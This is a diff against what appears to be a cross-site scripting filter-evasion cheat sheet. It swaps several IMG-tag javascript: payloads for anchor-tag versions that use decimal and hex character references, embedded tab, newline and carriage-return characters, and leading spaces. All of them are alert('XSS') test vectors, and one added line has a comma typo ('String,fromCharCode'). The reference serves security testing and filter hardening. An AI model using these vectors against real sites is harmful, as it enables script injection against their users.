@@ -58,7 +58,7 @@ This XSS method uses the relaxed rendering engine to create an XSS vector within
 If the system does not allow quotes of any kind, you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:
 
 ```html
-<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<a href="javascript:alert(String,fromCharCode(88,83,83))">Click Me!</a>
 ```
 
 ### Default SRC Tag to Get Past Filters that Check SRC Domain
@@ -100,7 +100,8 @@ This attack will bypass most SRC domain filters. Inserting JavaScript in an even
 Since XSS examples that use a `javascript:` directive inside an `<IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
 
 ```html
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+
+ <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
 ```
 
 ### Decimal HTML Character References Without Trailing Semicolons
@@ -108,7 +109,7 @@ Since XSS examples that use a `javascript:` directive inside an `<IMG` tag do no
 This is often effective in bypassing XSS filters that look for the string `&\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):
 
 ```html
-<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
 ```
 
 ### Hexadecimal HTML Character References Without Trailing Semicolons
@@ -116,7 +117,7 @@ This is often effective in bypassing XSS filters that look for the string `&\#XX
 This attack is also viable against the filter for the string `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:
 
 ```html
-<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
 ```
 
 ### Embedded Tab
@@ -125,7 +126,7 @@ This approach breaks up the XSS attack:
 
 <!-- markdownlint-disable MD010-->
 ```html
-<IMG SRC="jav	ascript:alert('XSS');">
+ <a href="jav	ascript:alert('XSS');">Click Me</a>
 ```
 <!-- markdownlint-enable MD010-->
 
@@ -134,7 +135,7 @@ This approach breaks up the XSS attack:
 This approach can also break up XSS:
 
 ```html
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
+ <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
 ```
 
 ### Embedded Newline to Break Up XSS
@@ -142,7 +143,7 @@ This approach can also break up XSS:
 While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference. The next four XSS attack examples illustrate this vector:
 
 ```html
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
 ```
 
 #### Example 1: Break Up XSS Attack with Embedded Carriage Return
@@ -150,7 +151,7 @@ While some defenders claim that any of the chars 09-13 (decimal) will work for t
 (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
 
 ```html
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
 ```
 
 #### Example 2: Break Up JavaScript Directive with Null
@@ -166,7 +167,7 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 This is useful if a filter's pattern match doesn't take into account spaces in the word `javascript:`, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:
 
 ```html
-<IMG SRC=" &#14;  javascript:alert('XSS');">
+<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
 ```
 
 #### Example 4: Non-alpha-non-digit XSS
